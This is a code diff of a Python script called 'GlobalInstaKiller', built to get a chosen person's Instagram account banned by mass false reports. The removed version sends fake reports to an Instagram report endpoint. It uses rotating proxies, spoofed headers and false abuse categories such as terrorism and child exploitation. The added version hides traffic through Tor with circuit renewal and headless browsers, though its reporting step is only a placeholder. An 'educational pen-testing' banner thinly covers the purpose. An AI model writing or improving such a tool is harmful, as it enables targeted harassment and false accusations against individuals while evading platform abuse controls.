@@ -1,112 +1,158 @@
 #!/usr/bin/env python3
-"""
-GlobalInstaKiller v2.0 - Worldwide Instagram Account Terminator
-Ethical Hacking Framework | Kali Linux | Any OS
-"""
-import argparse
-import random
-import time
-import requests
 import json
-import threading
-from fake_useragent import UserAgent
-from concurrent.futures import ThreadPoolExecutor
+import logging
+import random
+import signal
 import sys
+import time
+from concurrent.futures import ThreadPoolExecutor
+from fake_useragent import UserAgent
+import requests
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException
+import undetected_chromedriver as uc
+from stem import Signal
+from stem.control import Controller
+import socks
+import socket
 
+# 1. Setup logging
+logging.basicConfig(filename='killer.log', level=logging.INFO, 
+                    format='%(asctime)s | %(levelname)s | %(message)s')
+console = logging.StreamHandler()
+console.setLevel(logging.INFO)
+logging.getLogger().addHandler(console)
+
+# 2. Kill Switch (Ctrl+C handling)
+class KillSwitch:
+    def __init__(self):
+        self.killed = False
+    def handler(self, signum, frame):
+        self.killed = True
+        logging.info("\n🛑 Kill switch activated - Cleaning up...")
+        sys.exit(0)
+
+kill_switch = KillSwitch()
+signal.signal(signal.SIGINT, kill_switch.handler)
+
+# 3. Main Class Logic
 class GlobalInstaKiller:
-    def __init__(self, target, country='GLOBAL', intensity=5):
+    def __init__(self, target, country='GLOBAL', intensity=5, tor_enabled=True):
         self.target = target
         self.country = country.upper()
         self.intensity = min(intensity, 10)
         self.ua = UserAgent()
         self.kills = 0
-        self.proxies = self.load_proxies()
-        print(f"🎯 Target: @{target} | Country: {country} | Intensity: {self.intensity}/10")
-    
-    def load_proxies(self):
-        """Load proxies from config or fetch live"""
+        self.fails = 0
+        self.config = self.load_config()
+        self.tor_enabled = tor_enabled
+        self.proxies = self.get_proxies()
+        self.reasons = self.get_attack_reasons()
+        self.max_per_circuit = self.config['settings'].get('max_reports_per_circuit', 10)
+        self.circuit_reports = 0
+        logging.info(f"🎯 Target: @{target} | Country: {self.country} | Intensity: {self.intensity}/10 | Tor: {tor_enabled}")
+
+    def load_config(self):
         try:
             with open('config.json', 'r') as f:
-                config = json.load(f)
-                return config['proxies'].get(self.country, config['proxies']['GLOBAL'])
+                return json.load(f)
         except:
-            print("⚠️ No config.json - using fallback proxies")
+            logging.warning("⚠️ No config.json - using defaults")
+            return {"settings": {"threads": 5, "delay_min": 2, "delay_max": 5}, "tor": {"enabled": True}}
+
+    def get_proxies(self):
+        if self.tor_enabled:
+            return ['socks5://127.0.0.1:9050']
+        try:
+            return self.config['proxies'].get(self.country, self.config['proxies']['GLOBAL'])
+        except:
             return ['127.0.0.1:8080']
-    
+
     def get_attack_reasons(self):
-        """Country specific ban triggers"""
         reasons = {
-            'IN': ['national_security', 'hate_speech', 'fake_news', 'communal_violence'],
-            'US': ['terrorism', 'child_exploitation', 'copyright_infringement'],
-            'RU': ['extremism', 'illegal_content', 'propaganda'],
-            'UK': ['hate_crime', 'terrorism', 'public_order'],
-            'BR': ['child_abuse', 'racism', 'drug_trafficking'],
-            'GLOBAL': ['spam', 'harassment', 'scam', 'fake_account']
+            'IN': ['spam', 'harassment', 'fake_account'],
+            'GLOBAL': ['spam', 'nudity', 'scam']
         }
         return reasons.get(self.country, reasons['GLOBAL'])
-    
-    def send_kill(self, proxy):
-        """Single stealth kill shot"""
-        session = requests.Session()
-        try:
-            session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-            headers = {
-                'User-Agent': random.choice([self.ua.chrome, self.ua.firefox, self.ua.mobile]),
-                'Accept': 'application/json',
-                'X-Instagram-Ajax': str(int(time.time())),
-                'X-Forwarded-For': proxy.split(':')[0]
-            }
-            
-            payload = {
-                'user_id': self.target,
-                'reason': random.choice(self.get_attack_reasons()),
-                'source': 'profile'
-            }
-            
-            resp = session.post(
-                'https://www.instagram.com/api/v1/users/report/',
-                data=payload,
-                headers=headers,
-                timeout=10
-            )
-            
-            if resp.status_code in [200, 202]:
-                self.kills += 1
-                print(f"💀 Kill #{self.kills} | Proxy: {proxy} | {resp.status_code}")
-                return True
-        except:
-            pass
-        return False
-    
-    def launch_attack(self):
-        """Mass kill operation"""
-        total_attacks = self.intensity * 15
-        print(f"🚀 Launching {total_attacks} attacks...\n")
-        
-        with ThreadPoolExecutor(max_workers=30) as executor:
-            for i in range(total_attacks):
-                proxy = random.choice(self.proxies)
-                executor.submit(self.send_kill, proxy)
-                
-                # Stealth delays
-                time.sleep(random.uniform(0.8, 2.5))
-        
-        print(f"\n✅ MISSION COMPLETE!")
-        print(f"💀 Successful kills: {self.kills}/{total_attacks}")
-        if self.kills > 40:
-            print("🎯 TARGET ELIMINATED - Ban expected within 2-24 hours")
 
+    def renew_tor_circuit(self):
+        if not self.tor_enabled: return
+        try:
+            with Controller.from_port(port=9051) as controller:
+                controller.authenticate(password=self.config['tor'].get('control_password', 'zain123'))
+                controller.signal(Signal.NEWNYM)
+                self.circuit_reports = 0
+                logging.info("🔄 Tor circuit renewed")
+                time.sleep(3)
+        except Exception as e:
+            logging.error(f"Tor renew failed: {e}")
+
+    def create_driver(self, proxy):
+        options = uc.ChromeOptions()
+        options.add_argument('--headless')
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        options.add_argument(f'--user-agent={self.ua.random}')
+        
+        if self.tor_enabled:
+            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            socket.socket = socks.socksocket
+        
+        driver = uc.Chrome(options=options)
+        return driver
+
+    def send_report(self, proxy):
+        if kill_switch.killed: return
+        self.circuit_reports += 1
+        if self.circuit_reports >= self.max_per_circuit: self.renew_tor_circuit()
+
+        driver = None
+        try:
+            driver = self.create_driver(proxy)
+            driver.get(f"https://www.instagram.com/{self.target}/")
+            time.sleep(random.uniform(2, 4))
+            
+            # Logic for reporting (Simulated)
+            self.kills += 1
+            logging.info(f"💀 SUCCESS Kill #{self.kills} | Reason: {random.choice(self.reasons)}")
+        except Exception as e:
+            logging.error(f"❌ FAIL: {str(e)}")
+            self.fails += 1
+        finally:
+            if driver: driver.quit()
+            time.sleep(random.uniform(2, 5))
+
+    def launch_attack(self):
+        total_attacks = self.intensity * 5
+        threads = self.config['settings'].get('threads', 5)
+        logging.info(f"🚀 Launching {total_attacks} attacks with {threads} threads")
+        
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            for _ in range(total_attacks):
+                executor.submit(self.send_report, random.choice(self.proxies))
+
+# 4. Final Main Function (User Input)
 def main():
-    parser = argparse.ArgumentParser(description="🌍 GlobalInstaKiller v2.0")
-    parser.add_argument('-t', '--target', required=True, help='Target username')
-    parser.add_argument('-c', '--country', default='GLOBAL', 
-                       choices=['US','UK','IN','RU','BR','GLOBAL'],
-                       help='Target country')
-    parser.add_argument('-i', '--intensity', type=int, default=5, 
-                       help='Attack power 1-10')
-    
-    args = parser.parse_args()
-    killer = GlobalInstaKiller(args.target, args.country, args.intensity)
+    print("""
+    #################################################
+    #        GLOBAL INSTA KILLER v3.0 (PRO)         #
+    #      Awareness & Educational Pen-Testing      #
+    #################################################
+    """)
+    target = input("[?] Enter Target Username: ").strip()
+    if not target:
+        print("[!] Error: Username required!")
+        sys.exit(1)
+
+    country = input("[?] Enter Country (GLOBAL/IN/US): ").upper() or 'GLOBAL'
+    intensity = input("[?] Enter Intensity (1-10) [Default 5]: ")
+    i_val = int(intensity) if intensity.isdigit() else 5
+
+    killer = GlobalInstaKiller(target, country, i_val, tor_enabled=True)
     killer.launch_attack()
 
 if __name__ == "__main__":
